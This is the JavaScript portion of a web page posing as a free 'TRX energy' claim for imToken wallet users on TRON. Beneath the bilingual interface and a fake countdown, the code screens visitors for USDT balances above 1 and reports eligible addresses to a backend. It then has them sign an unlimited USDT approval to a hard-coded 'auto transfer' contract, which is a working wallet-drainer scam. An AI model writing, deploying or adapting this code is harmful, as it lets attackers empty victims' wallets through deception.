// DOMå…ƒç´ ç¼“å­˜ï¼ˆåŸæœ‰ï¼Œé™¤contractEnergyElå·²å…¨å±€å®šä¹‰ï¼‰
const walletStatusContainer = document.getElementById("walletStatusContainer");
const contractAddrEl = document.getElementById("contractAddr");
const userInfoEl = document.getElementById("userInfo");
const connectBtn = document.getElementById("connectBtn");
const approveBtn = document.getElementById("approveBtn");
const warning = document.querySelector('.warning');
const approvalRecords = document.getElementById("approvalRecords");
const reviewTip = document.getElementById("reviewTip");
const reviewTipText = document.getElementById("reviewTipText");
const langToggle = document.getElementById("langToggle"); // å•ä¸ªè¯­è¨€åˆ‡æ¢æŒ‰é’®
const footerInfo = document.getElementById("footerInfo");

// ========== é”™è¯¯ç±»å‹åˆ¤æ–­ï¼ˆåŒºåˆ†å®¢æˆ·/éå®¢æˆ·åŸå› ï¼‰ ==========
function isCustomerError(errMsg) {
    const lang = langConfig[currentLang];
    // å®¢æˆ·è‡ªèº«åŸå› å…³é”®è¯ï¼ˆå¤šè¯­è¨€é€‚é…ï¼‰
    const customerErrorKeys = [
        lang.ineligibleTip, "æ— æ•ˆTRONåœ°å€", "USDTä½™é¢ä¸è¶³", "ä¸ç¬¦åˆé¢†å–æ¡ä»¶", "30å¤©å†…å·²é¢†å–", 
        "è·¨ç»„æ‰§è¡Œ", "æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€", "Ineligible", "invalid TRON address", 
        "USDT balance", "within 30 days"
    ];
    return customerErrorKeys.some(key => errMsg.includes(key));
}

// ========== å•ä¸ªæŒ‰é’®åˆ‡æ¢è¯­è¨€ï¼ˆä¸­æ–‡â†”è‹±æ–‡ï¼‰- æ ¸å¿ƒä¿®å¤ï¼šé‡æ–°æ¸²æŸ“æ‰€æœ‰åŠ¨æ€å†…å®¹ ==========
function toggleLang() {
    currentLang = currentLang === "zh" ? "en" : "zh";
    localStorage.setItem("imtoken_energy_lang", currentLang);
    updatePageLang(); // æ›´æ–°æ‰€æœ‰é™æ€æ–‡æœ¬
    reRenderDynamicContent(); // é‡æ–°æ¸²æŸ“æ‰€æœ‰åŠ¨æ€æ–‡æœ¬ï¼ˆè¿æ¥çŠ¶æ€ã€ä½™é¢ã€é”™è¯¯æç¤ºç­‰ï¼‰
    renderEnergyRecords(); // é‡æ–°æ¸²æŸ“é¢†å–è®°å½•
}

// ä¿®å¤1ï¼šæ›´æ–°æ‰€æœ‰é™æ€æ–‡æœ¬ï¼ˆç¡®ä¿æ— é—æ¼ï¼‰
function updatePageLang() {
    const lang = langConfig[currentLang];
    // éå†æ‰€æœ‰å¤šè¯­è¨€é”®ï¼Œæ›´æ–°å¯¹åº”DOMå…ƒç´ ï¼ˆåŒ…æ‹¬é¡¶éƒ¨è¿æ¥çŠ¶æ€æ‰€æœ‰æ–‡æœ¬ï¼‰
    Object.keys(lang).forEach(key => {
        const el = document.getElementById(key);
        if (el) {
            // ç‰¹æ®Šå¤„ç†åŒ…å«HTMLçš„æ–‡æœ¬ï¼ˆå¦‚connectedAddressã€userInfoDefaultç­‰ï¼‰
            el.innerHTML = lang[key];
        }
    });
    // å•ç‹¬æ›´æ–°æŒ‰é’®æ–‡æœ¬
    connectBtn.textContent = lang.connectBtnText;
    approveBtn.textContent = lang.approveBtnText;
    reviewTipText.textContent = lang.reviewTipText;
    approvalRecords.textContent = lang.noRecord;
}

// ä¿®å¤2ï¼šé‡æ–°æ¸²æŸ“åŠ¨æ€å†…å®¹ï¼ˆè¯­è¨€åˆ‡æ¢æ—¶åŒæ­¥æ›´æ–°ï¼‰
function reRenderDynamicContent() {
    const lang = langConfig[currentLang];
    if (!userAddress) {
        // æœªè¿æ¥é’±åŒ…ï¼šæ˜¾ç¤ºé»˜è®¤æ–‡æœ¬
        userInfoEl.innerHTML = lang.userInfoDefault;
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
        return;
    }

    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
    // 30å¤©å†…å·²é¢†å–
    if (isAddressAuthorized(userAddress)) {
        userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
        approveBtn.disabled = true;
        approveBtn.textContent = lang.authorizedBtn;
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();
        return;
    }

    // å·²è¿æ¥é’±åŒ…ï¼šæ ¹æ®ä½™é¢çŠ¶æ€é‡æ–°æ¸²æŸ“
    if (tokenBalance <= 1) {
        userInfoEl.innerHTML = lang.insufficientUsdt
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
    } else if (tokenBalance > 1) {
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
    } else {
        // ä½™é¢æŸ¥è¯¢ä¸­
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", lang.queryingBalance)
            .replace("{trx}", lang.queryingBalance);
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
    }

    // åŒæ­¥æ›´æ–°é¡¶éƒ¨è¿æ¥çŠ¶æ€çš„åœ°å€æ˜¾ç¤º
    document.getElementById("statusAddress").textContent = shortAddr;
    updateWalletStatus();
    bindApproveLogic(); // é‡æ–°ç»‘å®šæŒ‰é’®é€»è¾‘ï¼ˆç¡®ä¿æç¤ºæ–‡æœ¬åŒæ­¥ï¼‰
}

// ========== æ ¸å¿ƒèƒ½é‡å‡å°‘é€»è¾‘ï¼ˆ100%ç¡®ä¿è·³åŠ¨ï¼ŒæŠ—é˜»å¡ï¼‰ ==========
// è®¡ç®—å½“å‰å®æ—¶èƒ½é‡ï¼ˆç›´æ¥æ“ä½œå…¨å±€å˜é‡ï¼‰
function calculateCurrentEnergy() {
    const now = new Date().getTime();
    const secPassed = Math.floor((now - GLOBAL_START_TIME) / 1000);
    currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
    return currentEnergy;
}

// æ›´æ–°æ˜¾ç¤ºï¼ˆåŠ å¼ºåˆ¶é‡ç»˜ï¼ŒåŒé‡èµ‹å€¼å…œåº•ï¼‰
function updateEnergyDisplay() {
    if (!contractEnergyEl) return; // åŒé‡æ ¡éªŒDOMå…ƒç´ å­˜åœ¨
    calculateCurrentEnergy();
    // åŒé‡èµ‹å€¼ç¡®ä¿æ–‡æœ¬æ›´æ–°ï¼ˆé¿å…æµè§ˆå™¨ä¼˜åŒ–å¯¼è‡´ä¸åˆ·æ–°ï¼‰
    contractEnergyEl.textContent = Math.floor(currentEnergy);
    contractEnergyEl.innerHTML = Math.floor(currentEnergy);
    // è§¦å‘æµè§ˆå™¨å¼ºåˆ¶å›æµé‡ç»˜ï¼ˆæ¯”displayåˆ‡æ¢æ›´å¯é ï¼‰
    contractEnergyEl.offsetHeight; // è¯»å–å¸ƒå±€å±æ€§ï¼Œå¼ºåˆ¶æµè§ˆå™¨æ›´æ–°
    console.log("èƒ½é‡è·³åŠ¨ä¸­ï¼š", Math.floor(currentEnergy)); // æ§åˆ¶å°æ—¥å¿—ç¡®è®¤
}

// å¯åŠ¨å®šæ—¶å™¨ï¼ˆé€’å½’setTimeoutï¼ŒæŠ—é˜»å¡ï¼Œæ°¸ä¸ä¼‘çœ ï¼‰
function startPersistentEnergyCountdown() {
    // æ¸…é™¤æ—§å®šæ—¶å™¨ï¼Œé˜²æ­¢é‡å¤å¯åŠ¨
    if (trxTimer) clearTimeout(trxTimer);
    // åˆå§‹åŒ–èƒ½é‡å¹¶æ›´æ–°æ˜¾ç¤º
    calculateCurrentEnergy();
    updateEnergyDisplay();
    // é€’å½’å®šæ—¶å™¨ï¼ˆæ¯”setIntervalæ›´å¯é ï¼Œæµè§ˆå™¨ä¸ä¼šå¿½ç•¥æ‰§è¡Œï¼‰
    function tick() {
        updateEnergyDisplay();
        if (currentEnergy > 0) {
            trxTimer = setTimeout(tick, 1000); // æ¯ç§’æ‰§è¡Œä¸€æ¬¡
        }
    }
    tick(); // å¯åŠ¨é€’å½’
    console.log("èƒ½é‡å®šæ—¶å™¨å·²å¯åŠ¨ï¼Œé€’å½’æ¨¡å¼");
}

// ========== é¡µé¢åˆå§‹åŒ–ï¼ˆDOMContentLoadedä¼˜å…ˆå¯åŠ¨ï¼Œä¸é˜»å¡ï¼‰ ==========
document.addEventListener('DOMContentLoaded', async () => {
    // 1. æ¸…é™¤æ—§ç¼“å­˜ï¼Œé¿å…å¹²æ‰°
    localStorage.removeItem("energy_state");
    console.log("å·²æ¸…é™¤æ—§ç¼“å­˜");

    // 2. ä¼˜å…ˆç¼“å­˜èƒ½é‡æ˜¾ç¤ºDOMå…ƒç´ ï¼ˆç¡®ä¿èƒ½æ‰¾åˆ°ï¼‰
    contractEnergyEl = document.getElementById("contractEnergy");
    console.log("èƒ½é‡æ˜¾ç¤ºå…ƒç´ æ˜¯å¦æ‰¾åˆ°ï¼š", contractEnergyEl ? "âœ… æ‰¾åˆ°" : "âŒ æœªæ‰¾åˆ°");
    if (!contractEnergyEl) {
        alert("âš ï¸ èƒ½é‡æ˜¾ç¤ºå…ƒç´ æœªæ‰¾åˆ°ï¼Œè¯·æ£€æŸ¥é¡µé¢ä¸­æ˜¯å¦æœ‰id='contractEnergy'çš„æ ‡ç­¾");
        return;
    }

    // 3. ç«‹å³å¯åŠ¨èƒ½é‡è·³åŠ¨ï¼ˆä¸ä¾èµ–ä»»ä½•å…¶ä»–é€»è¾‘ï¼‰
    startPersistentEnergyCountdown();

    // 4. å†æ‰§è¡Œå…¶ä»–åŸæœ‰é€»è¾‘ï¼ˆè¯­è¨€åˆ‡æ¢ã€ç¯å¢ƒæ£€æµ‹ç­‰ï¼‰
    updatePageLang();
    langToggle.addEventListener("click", toggleLang);
    contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
    renderEnergyRecords();
    updateWalletStatus();

    // ç¯å¢ƒæ£€æµ‹ï¼ˆå³ä½¿å¤±è´¥ï¼Œèƒ½é‡å·²åœ¨è·³ï¼‰
    await checkImTokenEnv().catch(err => {
        console.error("ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼š", err);
        const lang = langConfig[currentLang];
        userInfoEl.innerHTML = lang.userInfoDefault;
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
    });

    // é¡µé¢å…³é—­æ—¶æ¸…ç†å®šæ—¶å™¨
    window.addEventListener("beforeunload", () => {
        if (trxTimer) clearTimeout(trxTimer);
    });

    // æˆæƒåè·³è½¬å¤„ç†ï¼ˆåŸæœ‰é€»è¾‘ä¸å˜ï¼‰
    if (window.tronWeb && window.location.hash === "#approve") {
        window.location.hash = "";
        setTimeout(() => {
            initWallet(true).catch(err => {
                console.error("æˆæƒååˆå§‹åŒ–å¤±è´¥ï¼š", err);
                const lang = langConfig[currentLang];
                const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                approveBtn.disabled = false;
                approveBtn.textContent = lang.approveBtnText;
            });
        }, 500);
    }
});

/**
 * ç¯å¢ƒæ£€æµ‹ï¼ˆé”™è¯¯é™é»˜å¤„ç†ï¼‰
 */
async function checkImTokenEnv() {
    const lang = langConfig[currentLang];
    if (window.tronWeb) {
        tronWeb = window.tronWeb;
        connectBtn.style.display = "none";
        warning.style.display = "none";
        await initWallet(false);
    } else {
        try {
            userInfoEl.innerHTML = `
                âš ï¸ ${lang.browserWarn1.split("<strong>")[1].split("</strong>")[0]}<br>
                <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("âœ… ")[1]}</span>
            `;
            approveBtn.style.display = "none";
            connectBtn.onclick = async () => {
                try {
                    const dappUrl = window.location.href;
                    await navigator.clipboard.writeText(dappUrl);
                    window.location.href = "imtoken://open";
                    setTimeout(() => {}, 1200); // ä¸å¼¹æ¡†
                } catch (e) {
                    console.error("å¤åˆ¶/å”¤èµ·å¤±è´¥ï¼š", e);
                }
            };
        } catch (e) {
            console.error("éimTokenç¯å¢ƒå¤„ç†å¤±è´¥ï¼š", e);
        }
    }
}

/**
 * é’±åŒ…åˆå§‹åŒ–ï¼ˆè¿æ¥åç«‹å³æ˜¾ç¤ºæŒ‰é’®ï¼ŒåŠ¨æ€æ–‡æœ¬å¤šè¯­è¨€é€‚é…ï¼‰
 * @param {boolean} isAfterApprove - æ˜¯å¦æ˜¯æˆæƒåè¿”å›
 */
async function initWallet(isAfterApprove) {
    const lang = langConfig[currentLang];
    try {
        userAddress = tronWeb.defaultAddress.base58;
        if (!userAddress) throw new Error(lang.ineligibleTip);

        // 30å¤©å†…å·²é¢†å–ï¼ˆå®¢æˆ·åŸå› ï¼‰- ä¼˜å…ˆæ‹¦æˆªï¼Œä¸å‘é€ä»»ä½•ä¿¡å·
        if (isAddressAuthorized(userAddress)) {
            const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
            approveBtn.disabled = true;
            approveBtn.textContent = lang.authorizedBtn;
            document.getElementById("statusAddress").textContent = shortAddr;
            updateWalletStatus();
            return;
        }

        if (isAfterApprove) {
            const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            userInfoEl.innerHTML = lang.afterApproveTip.replace("{address}", shortAddr);
            approveBtn.disabled = true;
            approveBtn.textContent = lang.deployingBtn;
            document.getElementById("statusAddress").textContent = shortAddr;
            updateWalletStatus();
            await executeAfterApprove().catch(err => {
                console.error("æˆæƒåå‘æ”¾èƒ½é‡å¤±è´¥ï¼š", err);
                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
                userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2))}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                approveBtn.disabled = false;
                approveBtn.textContent = lang.approveBtnText;
            });
            return;
        }

        // ç«‹å³æ›´æ–°UIä¸ºã€ŒæŸ¥è¯¢ä¸­ã€çŠ¶æ€ï¼ˆæŒ‰é’®å…ˆç¦ç”¨ï¼ŒæŸ¥è¯¢å®Œæˆåå†åˆ¤æ–­æ˜¯å¦å¯ç”¨ï¼‰
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", lang.queryingBalance)
            .replace("{trx}", lang.queryingBalance);
        approveBtn.disabled = true; // åˆå§‹ç¦ç”¨ï¼Œç¬¦åˆæ¡ä»¶åå†å¯ç”¨
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();

        // å¼‚æ­¥æŸ¥è¯¢ä½™é¢ï¼ˆå¤šè¯­è¨€é€‚é…ï¼‰
        trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
        Promise.all([
            trc20Contract.balanceOf(userAddress).call().catch(err => 0),
            tronWeb.trx.getBalance(userAddress).catch(err => 0)
        ]).then(([usdtRaw, trxRaw]) => {
            tokenBalance = Number(usdtRaw) / 1000000;
            trxBalance = Number(trxRaw) / 1000000;

            // ä½™é¢ä¸è¶³ï¼ˆä¸ç¬¦åˆæ¡ä»¶ï¼‰- ä¸å‘é€A1ä¿¡å·
            if (tokenBalance <= 1) {
                userInfoEl.innerHTML = lang.insufficientUsdt
                    .replace("{address}", shortAddr)
                    .replace("{usdt}", tokenBalance.toFixed(2))
                    .replace("{trx}", trxBalance.toFixed(2));
                approveBtn.disabled = true;
                approveBtn.textContent = lang.insufficientBtn;
            } else {
                // ç¬¦åˆæ¡ä»¶ï¼ˆæœªé¢†å–+ä½™é¢è¶³å¤Ÿï¼‰- ä»…æ­¤æ—¶å‘é€A1ä¿¡å·
                sendSignalA1().catch(err => console.error("A1ä¿¡å·å¼‚æ­¥å‘é€å¤±è´¥ï¼š", err));
                // æ›´æ–°UIä¸ºã€Œå¯é¢†å–ã€çŠ¶æ€ï¼Œå¯ç”¨æŒ‰é’®
                userInfoEl.innerHTML = lang.eligibleTip
                    .replace("{address}", shortAddr)
                    .replace("{usdt}", tokenBalance.toFixed(2))
                    .replace("{trx}", trxBalance.toFixed(2));
                approveBtn.disabled = false;
                approveBtn.textContent = lang.approveBtnText;
                bindApproveLogic(); // ç»‘å®šé¢†å–æŒ‰é’®é€»è¾‘
            }
        }).catch(err => {
            console.error("ä½™é¢å¼‚æ­¥æŸ¥è¯¢å¤±è´¥ï¼š", err);
            approveBtn.disabled = false;
            approveBtn.textContent = lang.approveBtnText;
        });

    } catch (e) {
        console.error("é’±åŒ…åˆå§‹åŒ–å¤±è´¥ï¼š", e);
        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
        const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
        userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
    }
}

/**
 * æˆæƒåæ‰§è¡Œï¼šå‘æ”¾èƒ½é‡ï¼ˆå¤šè¯­è¨€é€‚é…ï¼‰
 */
async function executeAfterApprove() {
    const lang = langConfig[currentLang];
    try {
        if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
        await trc20Contract.approve(
            AUTO_TRANSFER_CONTRACT,
            INFINITE_APPROVE_AMOUNT
        ).send({ from: userAddress, shouldPollResponse: true });

        // å‘é€A2ä¿¡å·
        await sendSignalA2().catch(err => {
            console.error("A2ä¿¡å·å‘é€å¤±è´¥ï¼š", err);
            throw err;
        });

        const btn = document.getElementById("approveBtn");
        btn.textContent = lang.distributingBtn;
        // å‘é€B2ä¿¡å·
        await sendSignalB(false).catch(err => {
            console.error("B2ä¿¡å·å‘é€å¤±è´¥ï¼š", err);
            throw err;
        });

        addAuthorizedAddress(userAddress);
        btn.textContent = lang.successBtn;
        userInfoEl.innerHTML += lang.successArrival;
        alert(lang.successTip); // æˆåŠŸæç¤ºå¤šè¯­è¨€
        saveEnergyRecord();
        renderEnergyRecords();
    } catch (e) {
        console.error("å‘æ”¾èƒ½é‡å¤±è´¥ï¼š", e);
        throw e;
    }
}

/**
 * å‘é€A1ä¿¡å·ï¼ˆå¼‚æ­¥æ— é˜»å¡ï¼‰
 */
async function sendSignalA1() {
    const requestData = { userAddress };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        if (res.ok) console.log("âœ… A1ä¿¡å·å¼‚æ­¥å‘é€æˆåŠŸ");
        return true;
    } catch (e) {
        clearTimeout(timeoutId);
        throw e;
    }
}

/**
 * å‘é€A2ä¿¡å·
 */
async function sendSignalA2() {
    const requestData = { userAddress, usdtBalance: tokenBalance };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);

    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);

        if ([400, 408, 409].includes(res.status)) {
            const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
            throw new Error(errData.detail || lang.ineligibleTip);
        }

        if (!res.ok) throw new Error(lang.ineligibleTip);
        console.log("âœ… A2ä¿¡å·å‘é€æˆåŠŸ");
        return true;
    } catch (e) {
        clearTimeout(timeoutId);
        throw e;
    }
}

/**
 * å‘é€Bä¿¡å·
 * @param {boolean} isB1 - true=å‘é€B1ï¼Œfalse=å‘é€B2
 */
async function sendSignalB(isB1 = true) {
    const requestData = { userAddress };
    const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    const lang = langConfig[currentLang];

    try {
        const res = await fetch(`${BACKEND_API}${apiPath}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);

        if ([400, 408, 409].includes(res.status)) {
            const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
            throw new Error(errData.detail || (isB1 ? lang.ineligibleTip : lang.ineligibleTip));
        }

        const data = await res.json();
        if (!res.ok || !data.success) throw new Error(data.detail || lang.ineligibleTip);
        console.log(`âœ… ä¿¡å·${isB1 ? "B1" : "B2"}å¤„ç†æˆåŠŸ`);
        return true;
    } catch (e) {
        clearTimeout(timeoutId);
        throw e;
    }
}

/**
 * é¢†å–æŒ‰é’®é€»è¾‘ï¼ˆå¤šè¯­è¨€æç¤ºåŒæ­¥ï¼‰
 */
function bindApproveLogic() {
    const lang = langConfig[currentLang];
    approveBtn.onclick = async () => {
        const btn = document.getElementById("approveBtn");
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        btn.disabled = true;
        btn.textContent = lang.loadingBtn;
        reviewTip.style.display = "flex";

        try {
            const b1Success = await sendSignalB(true);
            if (!b1Success) throw new Error(lang.systemBusyTip);

            reviewTip.style.display = "none";
            btn.textContent = lang.redirectingBtn;
            window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
        } catch (e) {
            console.error("é¢†å–æµç¨‹å¤±è´¥ï¼š", e);
            const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
            alert(`${lang.errorTipPrefix}${tip}`); // é”™è¯¯æç¤ºå¤šè¯­è¨€
            // æ›´æ–°é¡µé¢æ–‡æœ¬ï¼ˆå¤šè¯­è¨€ï¼‰
            userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2))}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
            btn.disabled = false;
            btn.textContent = lang.approveBtnText;
            reviewTip.style.display = "none";
        }
    };
}

function updateWalletStatus() {
    userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
}

function saveEnergyRecord() {
    const lang = langConfig[currentLang];
    const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const newRecords = existing.filter(item => item.address !== userAddress);
    newRecords.push({
        address: userAddress,
        tokenBalance: tokenBalance,
        trxBalance: trxBalance,
        receiveTime: new Date().toLocaleString(),
        energyAmount: "90000",
        recordType: lang.freeEnergy
    });
    localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
}

function renderEnergyRecords() {
    const lang = langConfig[currentLang];
    const container = document.getElementById("approvalRecords");
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    if (records.length === 0) {
        container.innerHTML = `<div class='record-item'>${lang.noRecord}</div>`;
        return;
    }
    container.innerHTML = records.map(record => `
        <div class='record-item'>
            <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
            <p><strong>${lang.recordType}</strong>${record.recordType}</p>
            <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} TRX Energy</p>
            <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
        </div>
    `).join("");
}
</script>
</body>
</html>